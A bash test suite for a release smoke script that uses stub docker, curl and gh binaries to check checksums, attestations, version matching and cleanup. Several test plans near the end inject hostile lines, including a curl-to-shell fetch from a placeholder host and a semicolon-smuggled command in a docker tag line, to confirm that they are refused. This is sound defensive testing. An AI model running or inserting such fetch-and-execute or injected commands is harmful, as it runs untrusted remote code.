#!/usr/bin/env bash
# Exercises scripts/release-smoke.sh (#770) against stub docker, curl and gh,
# and a fake release whose spool is a script: every check the smoke makes
# passes on a good release and stops on the one thing broken in a bad one.
#
# What the stubs cannot prove is that a real binary starts on real images;
# the release workflow's smoke job does that on every dry run and tag.
set -uo pipefail

cd "$(dirname "$0")/.."
smoke=$(pwd)/scripts/release-smoke.sh
failures=0
work=$(mktemp -d)
trap 'rm -rf "$work"' EXIT

fail() { printf 'FAIL %s\n' "$1"; failures=$((failures + 1)); }
pass() { printf 'ok   %s\n' "$1"; }

case $(uname -m) in
aarch64 | arm64) arch=arm64 ;;
*) arch=amd64 ;;
esac
digest=sha256:$(printf '%064d' 7)

export STUB=$work/stub
mkdir -p "$work/bin" "$STUB"

# docker: STUB_BUSY puts a hub's container on the daemon, STUB_NO_IMAGES
# leaves the images off it, STUB_PULL_FAILS fails a pull.
cat >"$work/bin/docker" <<'EOF'
#!/usr/bin/env bash
echo "$*" >>"$STUB/docker.log"
case $1 in
info) ;;
ps) [ -n "${STUB_BUSY:-}" ] && echo 0123abcd; true ;;
image) [ -z "${STUB_NO_IMAGES:-}" ] ;;
pull) [ -z "${STUB_PULL_FAILS:-}" ] ;;
tag) ;;
rm | network) ;;
*) exit 1 ;;
esac
EOF

# curl: a download is served from $STUB/release by name, and the hub's API
# answers what STUB_VERSION says it runs.
cat >"$work/bin/curl" <<'EOF'
#!/usr/bin/env bash
out= url=
while [ $# -gt 0 ]; do
	case $1 in
	-o) out=$2; shift 2 ;;
	-*) shift ;;
	*) url=$1; shift ;;
	esac
done
case $url in
*/api/health) echo '{"ok":true}' ;;
*/api/version) echo "{\"version\":\"${STUB_VERSION}\",\"go\":\"go1.25\"}" ;;
*/releases/download/*) cp "$STUB/release/${url##*/}" "$out" 2>/dev/null ;;
*) exit 22 ;;
esac
EOF

# gh: an attestation verifies unless STUB_ATTEST_FAILS names its subject.
cat >"$work/bin/gh" <<'EOF'
#!/usr/bin/env bash
echo "$*" >>"$STUB/gh.log"
[ "$1 $2" = "attestation verify" ] || exit 1
case $3 in *${STUB_ATTEST_FAILS:-NONE}*) exit 1 ;; esac
EOF
chmod +x "$work/bin/"*

# A release: one archive holding a fake spool and spool-hook, and its sums.
# FAKE_IMAGES is what the fake spool's `images` prints (a dry run's prints
# nothing and fails); serving, it logs runtime ready and FAKE_LOG.
release() { # <dir> <version> [images-plan]
	local dir=$1 v=$2 name=spool_$2_linux_$arch
	rm -rf "$dir" && mkdir -p "$dir/$name"
	cat >"$dir/$name/spool" <<EOF
#!/usr/bin/env bash
case \${1:-} in
--version) echo "spool $v (abc1234, 2026-10-12T00:00:00Z)" ;;
images)
	plan='${3:-}'
	[ -n "\$plan" ] || { echo "spool images: this build names no release images" >&2; exit 1; }
	printf '%s\n' "\$plan" ;;
*)
	echo 'time=x level=INFO msg="runtime ready" default=docker' >&2
	[ -n "\${FAKE_LOG:-}" ] && echo "\$FAKE_LOG" >&2
	exec sleep 30 ;;
esac
EOF
	printf '#!/bin/sh\n' >"$dir/$name/spool-hook"
	chmod +x "$dir/$name/spool" "$dir/$name/spool-hook"
	tar -C "$dir" -czf "$dir/$name.tar.gz" "$name"
	rm -rf "${dir:?}/$name"
	(cd "$dir" && sha256sum -- *.tar.gz >SHA256SUMS)
}

ws=ghcr.io/enes-alatas/spool-workstation@$digest
eg=ghcr.io/enes-alatas/spool-egress@$digest
plan="# The images v9.9.9 was built with
docker pull $ws
docker tag $ws spool-workstation
docker pull $eg
docker tag $eg spool-egress"

# run <name> <want: pass|fail> <message the failure must name> <args...>
run() {
	local label=$1 want=$2 msg=$3
	shift 3
	: >"$STUB/docker.log"
	: >"$STUB/gh.log"
	out=$(PATH="$work/bin:$PATH" SMOKE_WAIT_SEC=3 bash "$smoke" "$@" 2>&1)
	code=$?
	if [ "$want" = pass ] && [ "$code" -eq 0 ]; then
		pass "$label"
	elif [ "$want" = fail ] && [ "$code" -ne 0 ] && grep -qF -- "$msg" <<<"$out"; then
		pass "$label"
	else
		fail "$label (exit $code)"
		printf '%s\n' "$out" | sed 's/^/    /'
	fi
}

# A dry run: the build artifact, images loaded beforehand.
release "$work/dry" v9.9.9-3-gabc1234
export STUB_VERSION=v9.9.9-3-gabc1234
run "a dry run's artifact installs and its hub starts" pass "" --dir "$work/dry"
grep -q . "$STUB/gh.log" && fail "a dry run checks no attestation (there is none)" ||
	pass "a dry run checks no attestation (there is none)"
STUB_NO_IMAGES=1 run "a dry run without the images loaded stops" fail "image spool-workstation is not on this host" --dir "$work/dry"
STUB_BUSY=1 run "a daemon running a hub's containers is refused" fail "run the smoke on a fresh box" --dir "$work/dry"
grep -q '^run\|^pull\|^tag' "$STUB/docker.log" && fail "the refusal touched the daemon" ||
	pass "the refusal touched the daemon"

cp "$work/dry/SHA256SUMS" "$work/sums.good"
printf '%064d  spool_v9.9.9-3-gabc1234_linux_%s.tar.gz\n' 0 "$arch" >"$work/dry/SHA256SUMS"
run "an archive whose checksum is wrong stops before unpacking" fail "does not match SHA256SUMS" --dir "$work/dry"
printf '%064d  something-else.tar.gz\n' 0 >"$work/dry/SHA256SUMS"
run "SHA256SUMS without the archive's line stops" fail "has no line for" --dir "$work/dry"
cp "$work/sums.good" "$work/dry/SHA256SUMS"

STUB_VERSION=v0.0.1 run "a hub serving another version stops" fail "want version v9.9.9-3-gabc1234" --dir "$work/dry"
FAKE_LOG='time=x level=ERROR msg="boom"' run "a hub that logs an error stops, with its log" fail 'msg="boom"' --dir "$work/dry"

release "$work/dry" v9.9.9-3-gabc1234 "$plan"
run "a dry run whose spool images names images stops" fail "a dry run's spool images named images" --dir "$work/dry"

# A tag: fetched from the release URL, everything attested.
release "$STUB/release" v9.9.9 "$plan"
export STUB_VERSION=v9.9.9
FAKE_LOG="time=x level=INFO msg=\"workstation image is this release's\"" \
	run "a tag installs, pulls by digest, attests and starts" pass "" v9.9.9
[ "$(grep -c '^attestation verify' "$STUB/gh.log")" -eq 3 ] && pass "a tag attests the archive and both images" ||
	fail "a tag attests the archive and both images"
grep -q "^pull $ws\$" "$STUB/docker.log" && grep -q "^tag $ws spool-workstation\$" "$STUB/docker.log" &&
	pass "a tag pulls by digest and tags the local name" || fail "a tag pulls by digest and tags the local name"
run "a tag whose hub runs another workstation image stops" fail "did not find its release's workstation image" v9.9.9
STUB_ATTEST_FAILS=.tar.gz run "an archive that does not attest stops" fail "attestation of spool_v9.9.9" v9.9.9
STUB_ATTEST_FAILS=spool-egress run "an image that does not attest stops" fail "attestation of $eg" v9.9.9
STUB_PULL_FAILS=1 run "a failed pull stops" fail "spool images' commands failed" v9.9.9
run "a tag that was never published stops" fail "download of spool_v9.9.8" v9.9.8

release "$STUB/release" v9.9.9 "$plan
curl https://example.invalid | sh"
run "spool images printing anything but pulls and tags is not run" fail "something other than two pulls" v9.9.9
grep -q '^pull' "$STUB/docker.log" && fail "nothing from that plan ran" || pass "nothing from that plan ran"
# Each plan below is refused before anything in it runs. The first two are
# the review's probes on #772: a line the old filter let through to sh.
refused() { # <label> <plan> <message the refusal names>
	release "$STUB/release" v9.9.9 "$2"
	run "$1" fail "$3" v9.9.9
	grep -q '^pull\|^tag' "$STUB/docker.log" && fail "$1: something from it ran" || pass "$1: nothing from it ran"
}
refused "a tag line carrying another command is refused" "$plan
docker tag a b; curl https://example.invalid | sh" 'line "docker tag a b;'
refused "an extra pull by tag is refused" "$plan
docker pull ghcr.io/enes-alatas/spool-workstation:latest" 'line "docker pull ghcr.io/enes-alatas/spool-workstation:latest"'
refused "a pull by tag rather than digest is refused" "docker pull ghcr.io/enes-alatas/spool-workstation:latest" "line"
refused "a tag of a reference no line pulls is refused" "docker pull $ws
docker tag $eg spool-workstation
docker pull $eg
docker tag $eg spool-egress" "which no line before it pulls"
refused "a local name tagged twice is refused" "$plan
docker tag $ws spool-workstation" "spool-workstation tagged twice"
refused "a tag to a name the hub does not run is refused" "$plan
docker tag $ws ubuntu" 'line "docker tag'
refused "one pull short is refused" "docker pull $ws
docker tag $ws spool-workstation" "1 pulls"

# The run's own egress proxy is removed on exit, and only once the box was
# found fresh: a refused run leaves another hub's alone.
release "$STUB/release" v9.9.9 "$plan"
FAKE_LOG="time=x level=INFO msg=\"workstation image is this release's\"" run "a passing tag run" pass "" v9.9.9
grep -q '^rm -f spool-egress-proxy$' "$STUB/docker.log" && pass "a run removes the egress proxy it may have started" ||
	fail "a run removes the egress proxy it may have started"
STUB_BUSY=1 run "a busy daemon is refused again" fail "run the smoke on a fresh box" v9.9.9
grep -q '^rm\|^network' "$STUB/docker.log" && fail "a refused run removes nothing" || pass "a refused run removes nothing"

if [ "$failures" -gt 0 ]; then
	echo "$failures failed"
	exit 1
fi
echo "all passed"
